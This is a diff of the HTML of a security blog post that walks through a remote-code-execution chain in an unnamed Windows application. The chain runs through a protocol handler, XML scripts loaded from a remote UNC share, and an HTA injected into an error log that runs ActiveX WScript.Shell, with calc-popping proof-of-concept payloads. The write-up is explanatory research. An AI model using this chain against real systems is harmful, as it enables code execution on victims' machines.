@@ -1,4 +1,4 @@
-<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Attack Surface Analysis - Part 3 - Resurrected Code Execution</title><link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.152.2"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image:src content="https://parsiya.net/blog/2021-09-26-attack-surface-analysis-part-3-resurrected-code-execution/03-powerglove-rce.jpg"><meta name=twitter:title content="Attack Surface Analysis - Part 3 - Resurrected Code Execution"><meta name=twitter:description content="In part 3 of my attack surface analysis series, I will discuss an undisclosed RCE.
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Attack Surface Analysis - Part 3 - Resurrected Code Execution</title><link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.155.3"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image:src content="https://parsiya.net/blog/2021-09-26-attack-surface-analysis-part-3-resurrected-code-execution/03-powerglove-rce.jpg"><meta name=twitter:title content="Attack Surface Analysis - Part 3 - Resurrected Code Execution"><meta name=twitter:description content="In part 3 of my attack surface analysis series, I will discuss an undisclosed RCE.
 This bug uses a combination of all tricks introduced in
 
 
@@ -27,7 +27,7 @@ an XML file that is a script for the app's internal instrumentation engine
 output file that stores the result script's execution.</p><p>I found a command named <code>BrowserOpen</code> in the instrumentation engine that takes a
 URI and runs it with <code>Process.Start(string)</code>. This allows us to run any local
 executable but without parameters. The instrumentation engine can pop calc if it
-runs this script.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+runs this script.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;C:/Windows/System32/calc.exe&#34;</span> <span style=color:#268bd2>/&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/MyRoot&gt;</span>
 </span></span></code></pre></div><p>We can abuse get some limited remote code execution in the application because
@@ -76,7 +76,7 @@ While debugging, I saw the app compares switches from input against a list of
 valid ones.</p><blockquote><p>Every computer science problem can be reduced to string comparison.</p><footer><strong>Parsia</strong>
 <cite>Self quote (lol)</cite></footer></blockquote><p>This was done in <code>System.Core.dll > namespace System.Linq</code>. By putting a
 breakpoint in the following function, I could see every valid switch in the
-value of <code>source</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#268bd2>public</span> <span style=color:#268bd2>static</span> TSource FirstOrDefault&lt;TSource&gt;(<span style=color:#719e07>this</span> IEnumerable&lt;TSource&gt; source, Func&lt;TSource, <span style=color:#dc322f>bool</span>&gt; predicate)
+value of <code>source</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#268bd2>public</span> <span style=color:#268bd2>static</span> TSource FirstOrDefault&lt;TSource&gt;(<span style=color:#719e07>this</span> IEnumerable&lt;TSource&gt; source, Func&lt;TSource, <span style=color:#dc322f>bool</span>&gt; predicate)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    <span style=color:#719e07>if</span> (source == <span style=color:#cb4b16>null</span>)
 </span></span><span style=display:flex><span>    {
@@ -112,7 +112,7 @@ of the post.</p><h2 id=output-file>Output File
 <a class=header-link href=#output-file><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>This output file is really useful. It contains the result of the script's
 execution. E.g., if I passed an empty file like
 <code>app.exe -script empty.xml output.txt</code>, I would get this helpful error in
-<code>output.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span>Script Failed:
+<code>output.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span>Script Failed:
 </span></span><span style=display:flex><span>  System.Xml.XmlException: Root element <span style=color:#719e07>is</span> missing.
 </span></span><span style=display:flex><span>   at System.Xml.XmlTextReaderImpl.Throw(Exception e)
 </span></span><span style=display:flex><span>   at System.Xml.XmlTextReaderImpl.ParseDocumentContent()
@@ -126,7 +126,7 @@ execution. E.g., if I passed an empty file like
 from the usage string for this switch (the extension of the file was <code>xml</code> in
 the example).</p><h2 id=loading-remote-files>Loading Remote Files
 <a class=header-link href=#loading-remote-files><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>I wanted to see if the app accepts UNC paths. I passed a non-existing UNC path
-to it and saw this error in the output file that confirmed my theory:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span>System.IO.IOException: The network path was not found.
+to it and saw this error in the output file that confirmed my theory:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span>System.IO.IOException: The network path was not found.
 </span></span><span style=display:flex><span>  at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
 </span></span><span style=display:flex><span>  at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access,
 </span></span><span style=display:flex><span>    Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize,
@@ -139,10 +139,10 @@ to it and saw this error in the output file that confirmed my theory:</p><div cl
 application. We can use this to instrument the application. That is how the
 app's tutorial walks the users through a simple workflow. We can use it to
 perform actions in the application (e.g., click buttons). I passed a dummy XML
-file to see how it behaves (mainly to see the error in the output file).</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;Root&gt;</span>
+file to see how it behaves (mainly to see the error in the output file).</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;Root&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;child</span> <span style=color:#268bd2>/&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/Root&gt;</span>
-</span></span></code></pre></div><p>And I got this error:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span>Script Failed:
+</span></span></code></pre></div><p>And I got this error:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span>Script Failed:
 </span></span><span style=display:flex><span>    System.InvalidOperationException: Unknown tag: Root
 </span></span><span style=display:flex><span>   at [redacted]
 </span></span><span style=display:flex><span>
@@ -151,12 +151,12 @@ file to see how it behaves (mainly to see the error in the output file).</p><div
 </span></span></code></pre></div><p>This stack trace pointed me to the location where the app was checking the root
 tag. I put a breakpoint in the chain and debugged the app with dnSpy, I was able
 to find the expected name of the root tag (remember what I said about reducing
-every problem to string comparison?). Let's call the root tag <code>MyRoot</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#268bd2>private</span> <span style=color:#719e07>void</span> runCommands(XDocument nfc)
+every problem to string comparison?). Let's call the root tag <code>MyRoot</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#268bd2>private</span> <span style=color:#719e07>void</span> runCommands(XDocument nfc)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    <span style=color:#586e75>// Code Removed</span>
 </span></span><span style=display:flex><span>    <span style=color:#586e75>// Check if the root tag is named &#34;MyRoot&#34;</span>
 </span></span><span style=display:flex><span>    <span style=color:#719e07>if</span> (nfc.Root.Name.ToString() != <span style=color:#2aa198>&#34;MyRoot)
-</span></span></span><span style=display:flex><span><span style=color:#2aa198></span>    {
+</span></span></span><span style=display:flex><span>    {
 </span></span><span style=display:flex><span>        <span style=color:#586e75>// If not, return an error.</span>
 </span></span><span style=display:flex><span>        XName name = nfc.Root.Name;
 </span></span><span style=display:flex><span>        <span style=color:#719e07>throw</span> <span style=color:#719e07>new</span> InvalidOperationException(...);
@@ -169,7 +169,7 @@ every problem to string comparison?). Let's call the root tag <code>MyRoot</code
 </span></span><span style=display:flex><span>        <span style=color:#586e75>// a very long switch/case structure that compares the name of each</span>
 </span></span><span style=display:flex><span>        <span style=color:#586e75>// child tag with the command names.</span>
 </span></span></code></pre></div><p>Turns out the format of the XML file is very simple. Each command is a separate
-child of the root tag. Something like this:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+child of the root tag. Something like this:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;Cmd1</span> <span style=color:#268bd2>/&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;Cmd2</span> <span style=color:#268bd2>/&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/MyRoot&gt;</span>
@@ -180,7 +180,7 @@ interaction. For example, there was a command named <code>TutorialButtonClick</c
 <a class=header-link href=#browseropen><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>I went through all the commands but most resulted in a crash. Until I got to
 <code>BrowserOpen</code> (fake name again). The following code executes this tag. It checks
 if the tag has a URI attribute. If so, it's converted to a URI and passed to the
-<code>Runtime.Instance.Open</code> method:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#586e75>// The original code was obfuscated so I renamed some variables to make it easier to read.</span>
+<code>Runtime.Instance.Open</code> method:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#586e75>// The original code was obfuscated so I renamed some variables to make it easier to read.</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>private</span> <span style=color:#719e07>void</span> runBrowserOpen(XElement command)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    <span style=color:#586e75>// Get the value of the &#34;URI&#34; attribute.</span>
@@ -191,12 +191,12 @@ if the tag has a URI attribute. If so, it's converted to a URI and passed to the
 </span></span><span style=display:flex><span>        Runtime.Instance.Open(<span style=color:#719e07>new</span> Uri(attribute));
 </span></span><span style=display:flex><span>    }
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>So our XML should look like this:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+</span></span></code></pre></div><p>So our XML should look like this:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;something&#34;</span> <span style=color:#268bd2>/&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/MyRoot&gt;</span>
 </span></span></code></pre></div><p>The input must satisfy the <code>Uri(input)</code> constructor. If there is an error,
 execution is stopped and the app prints a stack trace and error line to the
-output file.</p><p>The <code>Open</code> method does this.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#268bd2>public</span> <span style=color:#719e07>virtual</span> <span style=color:#719e07>void</span> Open(Uri uri)
+output file.</p><p>The <code>Open</code> method does this.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#268bd2>public</span> <span style=color:#719e07>virtual</span> <span style=color:#719e07>void</span> Open(Uri uri)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    <span style=color:#719e07>try</span>
 </span></span><span style=display:flex><span>    {
@@ -212,7 +212,7 @@ can spot it). If the platform is not Windows, it calls
 <code>Process.Start("open", URI)</code>. I am not sure if this line is also vulnerable to
 command injection or not. The app is only available on Windows so I did not look
 into it.</p><p>On Windows, the app first checks if the incoming URI has the <code>http</code> or <code>https</code>
-scheme with <code>IsPathForBrowser</code>. If not, it calls <code>Process.Start(URI)</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#268bd2>private</span> <span style=color:#719e07>void</span> OpenFileOrUrl(<span style=color:#dc322f>string</span> pathOrUri)
+scheme with <code>IsPathForBrowser</code>. If not, it calls <code>Process.Start(URI)</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#268bd2>private</span> <span style=color:#719e07>void</span> OpenFileOrUrl(<span style=color:#dc322f>string</span> pathOrUri)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    <span style=color:#719e07>if</span> (Runtime.IsOSPlatform(OSPlatform.Windows))
 </span></span><span style=display:flex><span>    {
@@ -244,7 +244,7 @@ try. Depending on the payload, <code>explorer.exe</code> does something. E.g.,
 <code>explore.exe https://example.net</code> opens the website in the default browser.</p><h3 id=popping-calc>Popping Calc
 <a class=header-link href=#popping-calc><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>We can do command injection here without any parameters. I have created a REPL
 at <a href=https://dotnetfiddle.net/o1mCnT target=_blank rel="noreferrer noopener">https://dotnetfiddle.net/o1mCnT</a> if you want to see the
-transformation.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#719e07>using</span> System;
+transformation.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#719e07>using</span> System;
 </span></span><span style=display:flex><span>                    
 </span></span><span style=display:flex><span><span style=color:#268bd2>public</span> <span style=color:#719e07>class</span> <span style=color:#268bd2>Program</span>
 </span></span><span style=display:flex><span>{
@@ -265,7 +265,7 @@ future. This means all of the following are converted to
 file:C:/Windows/System32/calc.exe
 file:/C:/Windows/System32/calc.exe
 file://C:/Windows/System32/calc.exe
-</code></pre><p>This script will pop calc (we can replace it with any other local executable).</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+</code></pre><p>This script will pop calc (we can replace it with any other local executable).</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;C:/Windows/System32/calc.exe&#34;</span> <span style=color:#268bd2>/&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/MyRoot&gt;</span>
 </span></span></code></pre></div><h1 id=rce-rejected-code-execution>RCE: Rejected Code Execution
@@ -298,11 +298,11 @@ vulnerable command-line switches:</p><ul><li><code>-script scriptSource.xml outp
 <code>output.xml</code>. This is just a normal text file and can be a local path that we
 can choose. It stores the output of the script. Let's see what we can inject in
 it. I passed an XML file with the correct root tag but a script tag from rgod's
-proof-of-concept:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+proof-of-concept:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;script&gt;</span>var x=new ActiveXObject(&#34;WScript.Shell&#34;);x.Exec(&#34;calc.exe&#34;);<span style=color:#268bd2>&lt;/script&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/MyRoot&gt;</span>
 </span></span></code></pre></div><p>And then run the app:</p><ul><li><code>appHandler://-script resurrected-test-injection.xml resurrected-test-output.hta</code></li></ul><p>The output file contains the stack trace and the
-<strong>exact line with the error as-is</strong>. BINGO!!1!!</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span>Script Failed:
+<strong>exact line with the error as-is</strong>. BINGO!!1!!</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cs data-lang=cs><span style=display:flex><span>Script Failed:
 </span></span><span style=display:flex><span>    System.InvalidOperationException: Unknown tag: script
 </span></span><span style=display:flex><span>   at [redacted]
 </span></span><span style=display:flex><span>
@@ -326,7 +326,7 @@ for the output file but the app did not resolve the environment variable. It did
 not work here but might work in another app so it's good to know.</p><span class=caption-wrapper><img class=caption src=02-env-var-error.png title="Environment variable error" alt="Environment variable error">
 <span class=caption-text>Environment variable error</span></span><p>I felt like I had a good proof-of-concept, but I wanted to do more. I can
 execute single binaries on the file system, why not inject the HTA in one
-command then execute it with another? Something like:</p><p><code>appHandler://-script \\IP\resurrected-exploit-1.xml C:/ProgramData/app/inject.hta</code></p><p>Where <code>resurrected-exploit-1.xml</code> is:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+command then execute it with another? Something like:</p><p><code>appHandler://-script \\IP\resurrected-exploit-1.xml C:/ProgramData/app/inject.hta</code></p><p>Where <code>resurrected-exploit-1.xml</code> is:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;script&gt;</span>var x=new ActiveXObject(&#34;WScript.Shell&#34;);x.Exec(&#34;calc.exe&#34;);<span style=color:#268bd2>&lt;/script&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;C:/ProgramData/app/inject.hta&#34;</span><span style=color:#268bd2>&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/MyRoot&gt;</span>
@@ -334,11 +334,11 @@ command then execute it with another? Something like:</p><p><code>appHandler://-
 eh? WELL, one big issue. The execution is stopped after the first error. The HTA
 is written to the file system but the <code>BrowserOpen</code> line is never executed :(</p><p>What if we invoke the app twice on the same web page? Instead of having two
 commands in one script we can have two different scripts (one injects and the
-second executes).</p><p><code>appHandler://-script \\IP\inject-HTA.xml C:/ProgramData/app/inject.hta</code></p><p>The script just injects the HTA:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+second executes).</p><p><code>appHandler://-script \\IP\inject-HTA.xml C:/ProgramData/app/inject.hta</code></p><p>The script just injects the HTA:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;script&gt;</span>var x=new ActiveXObject(&#34;WScript.Shell&#34;);x.Exec(&#34;calc.exe&#34;);<span style=color:#268bd2>&lt;/script&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/MyRoot&gt;</span>
 </span></span></code></pre></div><p>The second execution runs the injected HTA.</p><p><code>appHandler://-script \\IP\run-HTA.xml \\IP\did-it-execute.txt</code></p><p>The script executes the injected HTA and writes the output to our shared server
-(optional).</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+(optional).</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;MyRoot&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;C:/ProgramData/app/inject.hta&#34;</span><span style=color:#268bd2>&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/MyRoot&gt;</span>
 </span></span></code></pre></div><p>We can do this on one HTML page with JavaScript. Assigning the protocol handler
@@ -369,5 +369,5 @@ resolves them.</li></ol></div><footer><p class=meta><span class="byline author v
 (of course) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more. Contact me via any of these ways.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="me noopener noreferrer" href=https://infosec.exchange/@parsiya title=https://infosec.exchange/@parsiya><i class="fa fa-mastodon fa-3x"></i></a>
 <a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
 <a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
-<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/static-analysis/ title="Static Analysis">Static Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/blockchain/ title="Blockchain (lol)">Blockchain (lol)</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title="WinAppDbg (use Frida instead)">WinAppDbg (use Frida instead)</a></li><li><a href=https://awsome.pw title='AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability'>AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2025 Parsia - <a href=https://parsiya.net/license/>License</a> -
+<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/static-analysis/ title="Static Analysis">Static Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/blockchain/ title="Blockchain (lol)">Blockchain (lol)</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension 